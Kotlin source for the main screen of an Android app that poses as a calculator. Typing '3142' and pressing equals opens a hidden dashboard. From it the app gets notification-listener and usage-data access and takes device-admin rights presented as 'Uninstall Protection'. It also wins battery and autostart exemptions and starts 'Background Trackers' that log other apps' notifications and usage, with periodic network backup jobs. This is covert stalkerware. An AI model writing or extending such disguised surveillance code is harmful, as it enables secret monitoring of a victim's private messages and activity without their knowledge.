package com.android.mycalculator

import android.Manifest
import android.app.AlarmManager
import android.app.AppOpsManager
import android.app.NotificationManager
import android.app.admin.DevicePolicyManager
import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.view.View
import android.widget.Button
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {
    private lateinit var dbHelper: DatabaseHelper
    private lateinit var logTextView: TextView
    private lateinit var calculatorLayout: LinearLayout
    private lateinit var mainContentLayout: LinearLayout
    
    // Tab Containers
    private lateinit var containerPermissions: ScrollView
    private lateinit var containerLogs: LinearLayout
    private lateinit var btnTabPermissions: Button
    private lateinit var btnTabLogs: Button
    
    private lateinit var dpm: DevicePolicyManager
    private lateinit var adminComponent: ComponentName

    // Dashboard Buttons
    private lateinit var btnPermNotif: Button
    private lateinit var btnPermOverlay: Button
    private lateinit var btnPermWrite: Button
    private lateinit var btnPermDND: Button
    private lateinit var btnPermUsage: Button
    private lateinit var btnPermBattery: Button
    private lateinit var btnPermAlarm: Button
    private lateinit var btnPermData: Button
    private lateinit var btnPermPost: Button
    private lateinit var btnAdmin: Button
    private lateinit var btnStartServices: Button
    private lateinit var containerUsage: LinearLayout
    private lateinit var btnTabUsage: Button        
    private lateinit var usageLogTextView: TextView 
    // Calculator Variables
    private lateinit var display: TextView
    private var isCalculated = false
    private var lastResult = ""

    private val logUpdateReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            refreshLogs()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        dbHelper = DatabaseHelper(this)
        calculatorLayout = findViewById(R.id.calculatorLayout)
        mainContentLayout = findViewById(R.id.mainContentLayout)
        
        containerPermissions = findViewById(R.id.containerPermissions)
        containerLogs = findViewById(R.id.containerLogs)
        btnTabPermissions = findViewById(R.id.btnTabPermissions)
        btnTabLogs = findViewById(R.id.btnTabLogs)
        
        dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        adminComponent = ComponentName(this, AdminReceiver::class.java)

        setupTabs()
        setupCalculator()
        setupDashboard()
        
        val filter = IntentFilter("com.android.mycalculator.NEW_NOTIFICATION")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(logUpdateReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(logUpdateReceiver, filter)
        }
    }

    override fun onResume() {
        super.onResume()
        if (mainContentLayout.visibility == View.VISIBLE) {
            updateDashboardUI()
        }
    }

    private fun setupTabs() {
        containerUsage = findViewById(R.id.containerUsage)
        btnTabUsage = findViewById(R.id.btnTabUsage)
        usageLogTextView = findViewById(R.id.usageLogTextView)

        btnTabPermissions.setOnClickListener {
            containerPermissions.visibility = View.VISIBLE
            containerLogs.visibility = View.GONE
            containerUsage.visibility = View.GONE
            btnTabPermissions.backgroundTintList = getColorStateList(android.R.color.holo_green_dark)
            btnTabLogs.backgroundTintList = getColorStateList(android.R.color.darker_gray)
            btnTabUsage.backgroundTintList = getColorStateList(android.R.color.darker_gray)
        }

        btnTabLogs.setOnClickListener {
            containerPermissions.visibility = View.GONE
            containerLogs.visibility = View.VISIBLE
            containerUsage.visibility = View.GONE
            btnTabLogs.backgroundTintList = getColorStateList(android.R.color.holo_green_dark)
            btnTabPermissions.backgroundTintList = getColorStateList(android.R.color.darker_gray)
            btnTabUsage.backgroundTintList = getColorStateList(android.R.color.darker_gray)
            refreshLogs()
        }

        // NEW USAGE TAB CLICK LISTENER
        btnTabUsage.setOnClickListener {
            containerPermissions.visibility = View.GONE
            containerLogs.visibility = View.GONE
            containerUsage.visibility = View.VISIBLE
            btnTabUsage.backgroundTintList = getColorStateList(android.R.color.holo_green_dark)
            btnTabPermissions.backgroundTintList = getColorStateList(android.R.color.darker_gray)
            btnTabLogs.backgroundTintList = getColorStateList(android.R.color.darker_gray)
            refreshUsageLogs()
        }

        findViewById<Button>(R.id.btnRefreshUsage).setOnClickListener { refreshUsageLogs() }
        findViewById<Button>(R.id.btnClearUsage).setOnClickListener {
            dbHelper.writableDatabase.execSQL("DELETE FROM usage_logs")
            refreshUsageLogs()
            Toast.makeText(this, "Local usage logs cleared!", Toast.LENGTH_SHORT).show()
        }
    }

    private fun refreshUsageLogs() {
        val logs = dbHelper.getAllUsageLogs()
        usageLogTextView.text = if (logs.isNotEmpty()) logs else "Waiting for app usage data..."
    }

    private fun setupCalculator() {
        display = findViewById(R.id.calcDisplay)
        display.movementMethod = android.text.method.ScrollingMovementMethod()

        val typeButtons = listOf(
            R.id.btn0, R.id.btn1, R.id.btn2, R.id.btn3, R.id.btn4, 
            R.id.btn5, R.id.btn6, R.id.btn7, R.id.btn8, R.id.btn9, 
            R.id.btnDot, R.id.btnOpenBracket, R.id.btnCloseBracket, R.id.btnPercent
        )
        
        for (id in typeButtons) {
            findViewById<Button>(id).setOnClickListener {
                val b = it as Button
                if (isCalculated) {
                    display.text = ""
                    isCalculated = false
                }
                if (display.text.toString() == "0" && b.text != ".") display.text = ""
                display.append(b.text)
            }
        }

        val operatorButtons = listOf(R.id.btnAdd, R.id.btnSub, R.id.btnMul, R.id.btnDiv)
        for (id in operatorButtons) {
            findViewById<Button>(id).setOnClickListener {
                val b = it as Button
                if (isCalculated) {
                    display.text = lastResult
                    isCalculated = false
                }
                if (display.text.toString() == "0" && b.text == "-") {
                    display.text = "-"
                } else {
                    display.append(b.text)
                }
            }
        }

        findViewById<Button>(R.id.btnC).setOnClickListener {
            display.text = "0"
            isCalculated = false
            lastResult = ""
        }

        findViewById<Button>(R.id.btnDel).setOnClickListener {
            if (isCalculated) {
                display.text = "0"
                isCalculated = false
                return@setOnClickListener
            }
            val text = display.text.toString()
            if (text.length > 1) display.text = text.dropLast(1) else display.text = "0"
        }

        findViewById<Button>(R.id.btnEquals).setOnClickListener {
            val text = display.text.toString()

            if (text == "3142") {
                calculatorLayout.visibility = View.GONE
                mainContentLayout.visibility = View.VISIBLE
                updateDashboardUI()
                refreshLogs()
                return@setOnClickListener
            }

            if (isCalculated || text.isEmpty() || text == "0") return@setOnClickListener

            try {
                val result = CalculatorService.evaluate(text)
                val resultText = if (result % 1.0 == 0.0) result.toLong().toString() 
                                 else String.format("%.6f", result).trimEnd('0').trimEnd('.')
                
                lastResult = resultText
                display.text = "$text\n= $resultText" 
                isCalculated = true
            } catch (e: Exception) {
                display.text = "Error"
                isCalculated = true
            }
        }
    }

    private fun setupDashboard() {
        logTextView = findViewById(R.id.logTextView)
        btnPermNotif = findViewById(R.id.btnPermNotif)
        btnPermOverlay = findViewById(R.id.btnPermOverlay)
        btnPermWrite = findViewById(R.id.btnPermWrite)
        btnPermDND = findViewById(R.id.btnPermDND)
        btnPermUsage = findViewById(R.id.btnPermUsage)
        btnPermBattery = findViewById(R.id.btnPermBattery)
        btnPermAlarm = findViewById(R.id.btnPermAlarm)
        btnPermPost = findViewById(R.id.btnPermPost)
        btnPermData = findViewById(R.id.btnPermData)
        btnAdmin = findViewById(R.id.btnAdmin)
        btnStartServices = findViewById(R.id.btnStartServices)
        
        btnPermNotif.setOnClickListener { startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")) }
        
        btnPermOverlay.setOnClickListener {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName")))
            }
        }
        
        btnPermWrite.setOnClickListener {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                startActivity(Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS, Uri.parse("package:$packageName")))
            }
        }

        btnPermDND.setOnClickListener { startActivity(Intent(Settings.ACTION_NOTIFICATION_POLICY_ACCESS_SETTINGS)) }
        btnPermUsage.setOnClickListener { startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)) }
        
        btnPermBattery.setOnClickListener {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, Uri.parse("package:$packageName")))
            }
        }

        btnPermAlarm.setOnClickListener {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                startActivity(Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM, Uri.parse("package:$packageName")))
            }
        }

        btnPermPost.setOnClickListener {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                requestPermissions(arrayOf(Manifest.permission.POST_NOTIFICATIONS), 1001)
            }
        }
        btnPermData.setOnClickListener {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                startActivity(Intent(Settings.ACTION_IGNORE_BACKGROUND_DATA_RESTRICTIONS_SETTINGS, Uri.parse("package:$packageName")))
            }
        }
        btnAdmin.setOnClickListener {
            if (!dpm.isAdminActive(adminComponent)) {
                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                    putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                    putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "System utility requires active state.")
                }
                startActivity(intent)
            } else {
                dpm.removeActiveAdmin(adminComponent)
                updateDashboardUI()
                Toast.makeText(this, "Protection disabled.", Toast.LENGTH_SHORT).show()
            }
        }
        val btnAutoStart = findViewById<Button>(R.id.btnAutoStart)
        btnAutoStart.setOnClickListener {
            val intents = listOf(
                Intent().setComponent(ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity")),
                Intent().setComponent(ComponentName("com.letv.android.letvsafe", "com.letv.android.letvsafe.AutobootManageActivity")),
                Intent().setComponent(ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.optimize.process.ProtectActivity")),
                Intent().setComponent(ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startup.StartupAppListActivity")),
                Intent().setComponent(ComponentName("com.coloros.safecenter", "com.coloros.safecenter.startupapp.StartupAppListActivity")),
                Intent().setComponent(ComponentName("com.oppo.safe", "com.oppo.safe.permission.startup.StartupAppListActivity")),
                Intent().setComponent(ComponentName("com.iqoo.secure", "com.iqoo.secure.ui.phoneoptimize.AddWhiteListActivity")),
                Intent().setComponent(ComponentName("com.iqoo.secure", "com.iqoo.secure.ui.phoneoptimize.BgStartUpManager")),
                Intent().setComponent(ComponentName("com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.BgStartUpManagerActivity")),
                Intent().setComponent(ComponentName("com.samsung.android.lool", "com.samsung.android.sm.ui.battery.BatteryActivity")),
                Intent().setAction(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS)
            )
            
            var opened = false
            for (intent in intents) {
                try {
                    if (packageManager.resolveActivity(intent, 0) != null) {
                        startActivity(intent)
                        opened = true
                        break
                    }
                } catch (e: Exception) {}
            }
            if (!opened) Toast.makeText(this, "No custom OEM menu found on this device.", Toast.LENGTH_SHORT).show()
        }
        btnStartServices.setOnClickListener {
            startAllServices()
            Toast.makeText(this, "Background Trackers Started!", Toast.LENGTH_SHORT).show()
        }

        findViewById<Button>(R.id.btnRefresh).setOnClickListener { refreshLogs() }
        findViewById<Button>(R.id.btnClear).setOnClickListener {
            dbHelper.writableDatabase.execSQL("DELETE FROM logs")
            refreshLogs()
            Toast.makeText(this, "Local logs cleared!", Toast.LENGTH_SHORT).show()
        }
    }

    private fun updateDashboardUI() {
        val notifEnabled = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")?.contains(packageName) == true
        updateBtn(btnPermNotif, notifEnabled, "Notification Access")

        val overlayEnabled = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) Settings.canDrawOverlays(this) else true
        updateBtn(btnPermOverlay, overlayEnabled, "Display Over Other Apps")

        val writeEnabled = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) Settings.System.canWrite(this) else true
        updateBtn(btnPermWrite, writeEnabled, "Modify System Settings")

        val dndEnabled = (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager).isNotificationPolicyAccessGranted
        updateBtn(btnPermDND, dndEnabled, "Do Not Disturb Access")

        val appOps = getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
        val mode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            appOps.unsafeCheckOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, android.os.Process.myUid(), packageName)
        } else {
            @Suppress("DEPRECATION")
            appOps.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, android.os.Process.myUid(), packageName)
        }
        updateBtn(btnPermUsage, mode == AppOpsManager.MODE_ALLOWED, "Usage Data Access")

        val batteryEnabled = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            (getSystemService(Context.POWER_SERVICE) as PowerManager).isIgnoringBatteryOptimizations(packageName)
        } else true
        updateBtn(btnPermBattery, batteryEnabled, "Ignore Battery Optimization")

        val alarmEnabled = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            (getSystemService(Context.ALARM_SERVICE) as AlarmManager).canScheduleExactAlarms()
        } else true
        updateBtn(btnPermAlarm, alarmEnabled, "Exact Alarms")

        val postEnabled = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED
        } else true
        updateBtn(btnPermPost, postEnabled, "Post Notifications (A13+)")
        val dataEnabled = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            val connMgr = getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
            connMgr.restrictBackgroundStatus == android.net.ConnectivityManager.RESTRICT_BACKGROUND_STATUS_DISABLED
        } else true
        updateBtn(btnPermData, dataEnabled, "Unrestricted Data Usage")
        updateBtn(btnAdmin, dpm.isAdminActive(adminComponent), "Uninstall Protection")
    }

    private fun updateBtn(btn: Button, isGranted: Boolean, text: String) {
        if (isGranted) {
            btn.text = "✅ $text"
            btn.backgroundTintList = getColorStateList(android.R.color.holo_green_dark)
        } else {
            btn.text = "❌ $text"
            btn.backgroundTintList = getColorStateList(android.R.color.holo_red_dark)
        }
    }

    private fun startAllServices() {
        startService(Intent(this, NotificationService::class.java))
        startService(Intent(this, KeepAliveService::class.java))
        startService(Intent(this, HeartbeatService::class.java))
        AlarmScheduler.scheduleAlarms(this)
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            val jobScheduler = getSystemService(Context.JOB_SCHEDULER_SERVICE) as android.app.job.JobScheduler
            val job = android.app.job.JobInfo.Builder(1005, ComponentName(this, BackupJobService::class.java))
                .setPeriodic(60 * 60 * 1000)
                .setRequiredNetworkType(android.app.job.JobInfo.NETWORK_TYPE_ANY)
                .setRequiresDeviceIdle(false)
                .setRequiresCharging(false)
                .setPersisted(true)
                .build()
            jobScheduler.schedule(job)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        unregisterReceiver(logUpdateReceiver)
    }

    private fun refreshLogs() {
        val logs = dbHelper.getAllLogs()
        logTextView.text = if (logs.isNotEmpty()) logs else "Waiting for notifications..."
    }
}
